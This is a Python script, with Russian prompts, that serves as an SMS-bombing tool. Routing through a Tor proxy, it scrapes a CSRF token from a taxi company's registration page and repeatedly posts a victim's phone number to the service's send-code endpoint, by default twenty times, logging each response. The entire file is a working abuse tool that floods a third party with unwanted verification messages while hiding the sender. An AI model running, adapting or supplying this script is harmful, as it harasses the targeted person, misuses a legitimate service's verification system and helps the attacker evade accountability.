#!/usr/bin/python3

import requests
from time import sleep
import json
import os
import sys
import datetime
global proxy
global timeout
timeout = 10
proxy = "socks5://127.0.0.1:9050"
proxy = {"http" : proxy, "https" : proxy}
global filePath
filePath = "phone.log"


def log(stat : str, text : str):
    Text = "[{}] [{}] -> {}"
    now = datetime.datetime.now()
    time = f'{now.hour}:{now.minute}:{now.second}'
    Text = Text.format(time, stat, text)
    if not os.path.exists(filePath):
        f = open(filePath, 'w')
    else:
        f = open(filePath, 'a')
    f.write(f'{Text}\n')
    f.close()
    print(Text)
    


def startSpam(phone):
    try:
        ses = requests.Session()
        token = ses.get("https://registration.taxsee.com/ru/ru/", proxies=proxy, timeout = timeout).text.split('<meta name="csrf-token" content="')[1].split('"')[0]
        
        
        formatPhone = f"+7({phone[1:4]}){phone[4:7]}-{phone[7:9]}-{phone[9:11]}"
        log('LOG', f'Phone: {formatPhone}')

        data = {
            "_csrf-registration" : token,
            "RegistrationForm[place]" : "6",
            "RegistrationForm[phone]" : formatPhone,
            "RegistrationForm[phoneCountryCode]" : "ru",
            "RegistrationForm[appCode]" : "",
            "RegistrationForm[udid]" : "0187f88b9e091122ac84e09afcfc9e9b",
            "RegistrationForm[code]" : ""
            }

        r = ses.post("https://registration.taxsee.com/ru/ru-RU/registration/send-code/",data = data, proxies = proxy, timeout = timeout)
        di = json.loads(r.text)
        if 'errors' in di:
            log('ERROR', f'{phone} | {di["errors"]}')
        else:
            rr = json.loads(r.text)["message"].replace("<span class=\"phone-number\" dir=\"ltr\">", "").replace("</span>", "")
            log('LOG', f'Text: {rr}')
    except Exception as e:
        log('ERROR', f'{phone} | {e}')


if len(sys.argv) > 1:
   phone = sys.argv[1]
else:
   phone = input("Телефон с 8ки: ")

count = 20
if len(sys.argv) > 2:
    count = sys.argv[2]


for i in range(int(count)):
    log("INFO", f"Запуск в {i + 1} раз")
    startSpam(phone)




